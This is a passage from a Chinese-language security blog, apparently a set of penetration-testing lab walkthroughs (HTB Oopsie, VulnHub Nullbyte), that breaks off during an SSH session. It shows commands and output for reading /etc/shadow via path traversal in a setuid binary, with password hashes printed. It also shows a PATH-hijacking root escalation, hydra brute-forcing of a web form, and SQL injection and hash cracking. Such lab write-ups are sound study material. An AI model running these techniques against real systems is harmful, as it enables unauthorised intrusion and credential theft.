class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs bash">robert@oopsie:/usr/bin$ ^[[A<br>./bugtracker<br><br>------------------<br>: EV Bug Tracker :<br>------------------<br><br>Provide Bug ID: ../../../etc/shadow<br>../../../etc/shadow<br>---------------<br><br>root:$6$eD0n5saZ<span class="hljs-variable">$orykpdd7mVL</span>/lF57rIGwUzeSROPC1KRITJ45Nqn6P2BLaZ.tcSOy5fNFcOw9uBRkClgu5R9WlyxpEId5qOOVY.:18285:0:99999:7:::<br>daemon:*:18113:0:99999:7:::<br>bin:*:18113:0:99999:7:::<br>sys:*:18113:0:99999:7:::<br><span class="hljs-built_in">sync</span>:*:18113:0:99999:7:::<br>games:*:18113:0:99999:7:::<br>man:*:18113:0:99999:7:::<br>lp:*:18113:0:99999:7:::<br>mail:*:18113:0:99999:7:::<br>news:*:18113:0:99999:7:::<br>uucp:*:18113:0:99999:7:::<br>proxy:*:18113:0:99999:7:::<br>www-data:*:18113:0:99999:7:::<br>backup:*:18113:0:99999:7:::<br>list:*:18113:0:99999:7:::<br>irc:*:18113:0:99999:7:::<br>gnats:*:18113:0:99999:7:::<br>nobody:*:18113:0:99999:7:::<br>systemd-network:*:18113:0:99999:7:::<br>systemd-resolve:*:18113:0:99999:7:::<br>syslog:*:18113:0:99999:7:::<br>messagebus:*:18113:0:99999:7:::<br>_apt:*:18113:0:99999:7:::<br>lxd:*:18113:0:99999:7:::<br>uuidd:*:18113:0:99999:7:::<br>dnsmasq:*:18113:0:99999:7:::<br>landscape:*:18113:0:99999:7:::<br>pollinate:*:18113:0:99999:7:::<br>sshd:*:18284:0:99999:7:::<br>robert:$6$kriHoPwv<span class="hljs-variable">$iBt45Fu0g4R0uNWSubfjDRvtUSwxVu</span>.U1JhYKmT4voMWlVc3/u2nu0j0JZL0YWmm62vRgAs4acBl8Ge.S393H/:18285:0:99999:7:::<br>mysql:!:18284:0:99999:7:::<br></code></pre></td></tr></table></figure><p>确实存在本地任意文件读取，不过这个密码爆破不出结果(，只能再考虑别的方法，借助于搜索引擎发现可以利用环境变量搞事情，思维局限了没考虑到这方面。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">robert@oopsie:/usr/bin$ <span class="hljs-built_in">cd</span> /tmp<br><span class="hljs-built_in">cd</span> /tmp<br>robert@oopsie:/tmp$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/bash&quot;</span> &gt; <span class="hljs-built_in">cat</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/bash&quot;</span> &gt; <span class="hljs-built_in">cat</span><br>robert@oopsie:/tmp$ <span class="hljs-built_in">chmod</span> +x <span class="hljs-built_in">cat</span><br><span class="hljs-built_in">chmod</span> +x <span class="hljs-built_in">cat</span><br>robert@oopsie:/tmp$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 12K<br>131145 drwxrwxrwt  2 root   root   4.0K Jun  3 03:25 .<br>     2 drwxr-xr-x 24 root   root   4.0K Oct 11  2021 ..<br>131132 -rwxrwxr-x  1 robert robert   10 Jun  3 03:25 <span class="hljs-built_in">cat</span><br></code></pre></td></tr></table></figure><h4 id="环境变量提权"><a href="#环境变量提权" class="headerlink" title="环境变量提权"></a>环境变量提权</h4><ul><li>Navigate to the &#x2F;tmp folder.</li><li>Write the &#x2F;bin&#x2F;bash command to a new file named cat.</li><li>Give this newly created cat file executable permission with the chmod +x command.</li><li>To check the newly created cat file permissions, type ls -l and ensure the “x” flag.</li><li>To check the newly created cat file content, type cat .&#x2F;cat and ensure the content.</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs bash">robert@oopsie:/tmp$ <span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games<br>robert@oopsie:/tmp$ <span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span><br><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span><br>robert@oopsie:/tmp$ <span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br>/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games<br>robert@oopsie:/tmp$ <span class="hljs-built_in">which</span> <span class="hljs-built_in">cat</span><br><span class="hljs-built_in">which</span> <span class="hljs-built_in">cat</span><br>/tmp/cat<br>robert@oopsie:/tmp$ /usr/bin/bugtracker<br>/usr/bin/bugtracker<br><br>------------------<br>: EV Bug Tracker :<br>------------------<br><br>Provide Bug ID: 1<br>1<br>---------------<br><br>root@oopsie:/tmp<span class="hljs-comment"># whoami</span><br><span class="hljs-built_in">whoami</span><br>root<br>root@oopsie:/tmp<span class="hljs-comment"># id</span><br><span class="hljs-built_in">id</span><br>uid=0(root) gid=1000(robert) <span class="hljs-built_in">groups</span>=1000(robert),1001(bugtracker)<br>root@oopsie:/tmp<span class="hljs-comment"># uname -a</span><br><span class="hljs-built_in">uname</span> -a<br>Linux oopsie 4.15.0-76-generic <span class="hljs-comment">#86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br>root@oopsie:/tmp<span class="hljs-comment"># sudo -l</span><br>sudo -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> root on oopsie:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User root may run the following commands on oopsie:<br>    (ALL : ALL) ALL<br>root@oopsie:/tmp<span class="hljs-comment"># ip a</span><br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host<br>       valid_lft forever preferred_lft forever<br>2: ens160: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:50:56:b9:71:b9 brd ff:ff:ff:ff:ff:ff<br>    inet 10.129.95.191/16 brd 10.129.255.255 scope global ens160<br>       valid_lft forever preferred_lft forever<br>    inet6 dead:beef::250:56ff:feb9:71b9/64 scope global dynamic mngtmpaddr<br>       valid_lft 86398sec preferred_lft 14398sec<br>    inet6 fe80::250:56ff:feb9:71b9/64 scope <span class="hljs-built_in">link</span><br>       valid_lft forever preferred_lft forever<br>root@oopsie:/tmp<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Nullbyte靶机</title>
    <link href="/2023/05/59d54dfe404f.html"/>
    <url>/2023/05/59d54dfe404f.html</url>
    
    <content type="html"><![CDATA[<h1 id="Nullbyte-靶机"><a href="#Nullbyte-靶机" class="headerlink" title="Nullbyte 靶机"></a>Nullbyte 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap 扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.108<br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-27 02:59 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.108<br>Host is up (0.00022s latency).<br>Not shown: 65531 closed tcp ports (reset)<br>PORT      STATE SERVICE<br>80/tcp    open  http<br>111/tcp   open  rpcbind<br>777/tcp   open  multiling-http<br>38157/tcp open  unknown<br>MAC Address: 08:00:27:1C:0D:6F (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 2.04 seconds<br><br>┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -sC -O -p80,111,777,38157 192.168.56.108<br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-27 03:01 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.108<br>Host is up (0.00038s latency).<br><br>PORT      STATE SERVICE VERSION<br>80/tcp    open  http    Apache httpd 2.4.10 ((Debian))<br>|_http-title: Null Byte 00 - level 1<br>|_http-server-header: Apache/2.4.10 (Debian)<br>111/tcp   open  rpcbind 2-4 (RPC <span class="hljs-comment">#100000)</span><br>| rpcinfo: <br>|   program version    port/proto  service<br>|   100000  2,3,4        111/tcp   rpcbind<br>|   100000  2,3,4        111/udp   rpcbind<br>|   100000  3,4          111/tcp6  rpcbind<br>|   100000  3,4          111/udp6  rpcbind<br>|   100024  1          38157/tcp   status<br>|   100024  1          40076/udp   status<br>|   100024  1          53418/tcp6  status<br>|_  100024  1          53583/udp6  status<br>777/tcp   open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)<br>| ssh-hostkey: <br>|   1024 16:30:13:d9:d5:55:36:e8:1b:b7:d9:ba:55:2f:d7:44 (DSA)<br>|   2048 29:aa:7d:2e:60:8b:a6:a1:c2:bd:7c:c8:bd:3c:f4:f2 (RSA)<br>|   256 60:06:e3:64:8f:8a:6f:a7:74:5a:8b:3f:e1:24:93:96 (ECDSA)<br>|_  256 bc:f7:44:8d:79:6a:19:48:76:a3:e2:44:92:dc:13:a2 (ED25519)<br>38157/tcp open  status  1 (RPC <span class="hljs-comment">#100024)</span><br>MAC Address: 08:00:27:1C:0D:6F (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 13.57 seconds<br><br>┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --script=vuln -p80,111,777,38157 192.168.56.108 <br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-27 03:03 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.108<br>Host is up (0.00026s latency).<br><br>PORT      STATE SERVICE<br>80/tcp    open  http<br>| http-slowloris-check: <br>|   VULNERABLE:<br>|   Slowloris DOS attack<br>|     State: LIKELY VULNERABLE<br>|     IDs:  CVE:CVE-2007-6750<br>|       Slowloris tries to keep many connections to the target web server open and hold<br>|       them open as long as possible.  It accomplishes this by opening connections to<br>|       the target web server and sending a partial request. By doing so, it starves<br>|       the http server\<span class="hljs-string">&#x27;s resources causing Denial Of Service.</span><br><span class="hljs-string">|       </span><br><span class="hljs-string">|     Disclosure date: 2009-09-17</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       http://ha.ckers.org/slowloris/</span><br><span class="hljs-string">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|   /phpmyadmin/: phpMyAdmin</span><br><span class="hljs-string">|_  /uploads/: Potentially interesting folder</span><br><span class="hljs-string">|_http-stored-xss: Couldn\&#x27;</span>t find any stored XSS vulnerabilities.<br>|_http-csrf: Couldn\<span class="hljs-string">&#x27;t find any CSRF vulnerabilities.</span><br><span class="hljs-string">|_http-dombased-xss: Couldn\&#x27;</span>t find any DOM based XSS.<br>111/tcp   open  rpcbind<br>777/tcp   open  multiling-http<br>38157/tcp open  unknown<br>MAC Address: 08:00:27:1C:0D:6F (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 321.11 seconds<br></code></pre></td></tr></table></figure><h2 id="Web-界面查看"><a href="#Web-界面查看" class="headerlink" title="Web 界面查看"></a>Web 界面查看</h2><p><img src="/pic/d23d5fbf88cbc1c38cf23f700ba3db8b_MD5.png"></p><p>有一张图片，main.gif，源码中没有什么有价值的信息，目录爆破一下吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo gobuster <span class="hljs-built_in">dir</span> -u http://192.168.56.108 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,zip,html,sql,php -t 64<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>===============================================================<br>Gobuster v3.2.0-dev<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.56.108<br>[+] Method:                  GET<br>[+] Threads:                 64<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.2.0-dev<br>[+] Extensions:              sql,php,txt,zip,html<br>[+] Timeout:                 10s<br>===============================================================<br>2023/05/27 05:11:27 Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.html                (Status: 403) [Size: 294]<br>/uploads              (Status: 301) [Size: 318] [--&gt; http://192.168.56.108/uploads/]<br>/index.html           (Status: 200) [Size: 196]<br>/.php                 (Status: 403) [Size: 293]<br>/javascript           (Status: 301) [Size: 321] [--&gt; http://192.168.56.108/javascript/]<br>/phpmyadmin           (Status: 301) [Size: 321] [--&gt; http://192.168.56.108/phpmyadmin/]<br>/.html                (Status: 403) [Size: 294]<br>/.php                 (Status: 403) [Size: 293]<br>/server-status        (Status: 403) [Size: 302]<br>Progress: 1321309 / 1323366 (99.84%)===============================================================<br>2023/05/27 05:15:20 Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>看一下 phpmyadmin </p><p><img src="/pic/3873cb73971bde1d7165d36794ddb200_MD5.png"></p><p>尝试弱密码失败，总不能爆破吧……再看看 uploads</p><p><img src="/pic/564c4c0f4c1a237e8d227a9da585d934_MD5.png"></p><p>emmmm 还是没啥思路，看一眼红队笔记，原来是首页图片中包含了隐藏信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Nullbyte]<br>└─$ wget http://192.168.56.108/main.gif<br>--2023-05-28 03:43:54--  http://192.168.56.108/main.gif<br>Connecting to 192.168.56.108:80... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 16647 (16K) [image/gif]<br>Saving to: ‘main.gif’<br><br>main.gif                                                   100%[=======================================================================================================================================&gt;]  16.26K  --.-KB/s    <span class="hljs-keyword">in</span> 0s      <br><br>2023-05-28 03:43:54 (95.3 MB/s) - ‘main.gif’ saved [16647/16647]<br></code></pre></td></tr></table></figure><p>使用工具查看文件头和基础信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Nullbyte]<br>└─$ file main.gif    <br>main.gif: GIF image data, version 89a, 235 x 302<br><br>┌──(kali㉿kali)-[~/Downloads/Nullbyte]<br>└─$ binwalk main.gif <br><br>DECIMAL       HEXADECIMAL     DESCRIPTION<br>------------------------------------------------------------------------<br>0             0x0             GIF image data, version <span class="hljs-string">&quot;89a&quot;</span>, 235 x 302<br><br>┌──(kali㉿kali)-[~/Downloads/Nullbyte]<br>└─$ exiftool main.gif <br>ExifTool Version Number         : 12.57<br>File Name                       : main.gif<br>Directory                       : .<br>File Size                       : 17 kB<br>File Modification Date/Time     : 2015:08:01 12:39:30-04:00<br>File Access Date/Time           : 2023:05:28 03:44:10-04:00<br>File Inode Change Date/Time     : 2023:05:28 03:43:54-04:00<br>File Permissions                : -rw-r--r--<br>File Type                       : GIF<br>File Type Extension             : gif<br>MIME Type                       : image/gif<br>GIF Version                     : 89a<br>Image Width                     : 235<br>Image Height                    : 302<br>Has Color Map                   : No<br>Color Resolution Depth          : 8<br>Bits Per Pixel                  : 1<br>Background Color                : 0<br>Comment                         : P-): kzMb5nVYJw<br>Image Size                      : 235x302<br>Megapixels                      : 0.071<br></code></pre></td></tr></table></figure><p>得到一串很短的字符，这时候需要发散思维，首先尝试 phpmyadmin 登录，失败。其次尝试是否是 base64 或者其他的加密方式，失败。最后尝试目录，成功</p><p><img src="/pic/910d473098a3ea8fb9062571638cfa57_MD5.png"></p><p>看来是个需要输入密码的地方，看一眼网页源代码</p><p><img src="/pic/f89b32feebdc272bc0662f472bb45ae5_MD5.png"></p><p>应该是可以爆破的，那就尝试 hydra 爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Nullbyte]<br>└─$ hydra -l root -P /usr/share/wordlists/rockyou.txt -s 80 192.168.56.108 http-post-form <span class="hljs-string">&quot;/kzMb5nVYJw/index.php:key=^PASS^:invalid key&quot;</span><br>Hydra v9.2 (c) 2021 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> not use <span class="hljs-keyword">in</span> military or secret service organizations, or <span class="hljs-keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-05-28 04:01:11<br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task<br>[DATA] attacking http-post-form://192.168.56.108:80/kzMb5nVYJw/index.php:key=^PASS^:invalid key<br>[STATUS] 4504.00 tries/min, 4504 tries <span class="hljs-keyword">in</span> 00:01h, 14339895 to <span class="hljs-keyword">do</span> <span class="hljs-keyword">in</span> 53:04h, 16 active<br>[STATUS] 4088.00 tries/min, 12264 tries <span class="hljs-keyword">in</span> 00:03h, 14332135 to <span class="hljs-keyword">do</span> <span class="hljs-keyword">in</span> 58:26h, 16 active<br>[80][http-post-form] host: 192.168.56.108   login: root   password: elite<br>1 of 1 target successfully completed, 1 valid password found<br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-05-28 04:07:27<br></code></pre></td></tr></table></figure><p>成功得到了密码，进入之后发现是个根据用户名查询信息的界面，异常简陋，看起来可能存在 sql 注入，尝试 <code>&#39;</code> 失败，得到如下结果，分别尝试数字和 <code>&#39;</code> 的拼接还是这个界面，</p><p><img src="/pic/c94cc51228028324381d85c043c760f8_MD5.png"></p><p>尝试 <code>&quot;</code> 成功，然后就是手工构造 sql 注入语句的过程</p><p><img src="/pic/eae0e776267506217f8024b4cef154cb_MD5.png"></p><p>联合查询</p><p><img src="/pic/e13059c3d018018df20af0638093e3b2_MD5.png"></p><p>查看数据库名</p><p><img src="/pic/3a2d26af4b5ca61f4309ce8914eb1091_MD5.png"></p><p>查看表名</p><p><img src="/pic/5c7c5275db391de0f2c0871b8eb0fcc6_MD5.png"></p><p>查看列名</p><p><img src="/pic/677942334b57e57092cf330f7f3ebe0b_MD5.png"></p><p>查看内容</p><p><img src="/pic/3e80ad7f581fd4fdabda609b323c2b4d_MD5.png"></p><p>base 64 解密一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Nullbyte]<br>└─$ <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE-&quot;</span> | <span class="hljs-built_in">base64</span> -d<br>c6d6bd7ebf806f43c76acc3681703b81base64: invalid input<br></code></pre></td></tr></table></figure><p>看起来还是一层加密</p><p><img src="/pic/dca22fa6361b6f120af4c63776335fb7_MD5.png"></p><p>找一找 hash 破解工具</p><p><img src="/pic/0c3f1fee46eb54e9cd3f53fe0f34f4e4_MD5.png"></p><p>得到了密码，和之前的用户名一起，尝试 ssh 登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Nullbyte]<br>└─$ ssh ramses@192.168.56.108 -p777<br>ramses@192.168.56.108\<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string"></span><br><span class="hljs-string">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="hljs-string">the exact distribution terms for each program are described in the</span><br><span class="hljs-string">individual files in /usr/share/doc/*/copyright.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="hljs-string">permitted by applicable law.</span><br><span class="hljs-string">Last login: Sun Aug  2 01:38:58 2015 from 192.168.1.109</span><br><span class="hljs-string">ramses@NullByte:~$ whoami</span><br><span class="hljs-string">ramses</span><br><span class="hljs-string">ramses@NullByte:~$ id</span><br><span class="hljs-string">uid=1002(ramses) gid=1002(ramses) groups=1002(ramses)</span><br><span class="hljs-string">ramses@NullByte:~$ uname -a</span><br><span class="hljs-string">Linux NullByte 3.16.0-4-686-pae #1 SMP Debian 3.16.7-ckt11-1+deb8u2 (2015-07-17) i686 GNU/Linux</span><br><span class="hljs-string">ramses@NullByte:~$ ip a</span><br><span class="hljs-string">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default </span><br><span class="hljs-string">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="hljs-string">    inet 127.0.0.1/8 scope host lo</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 ::1/128 scope host </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000</span><br><span class="hljs-string">    link/ether 08:00:27:1c:0d:6f brd ff:ff:ff:ff:ff:ff</span><br><span class="hljs-string">    inet 192.168.56.108/24 brd 192.168.56.255 scope global eth0</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 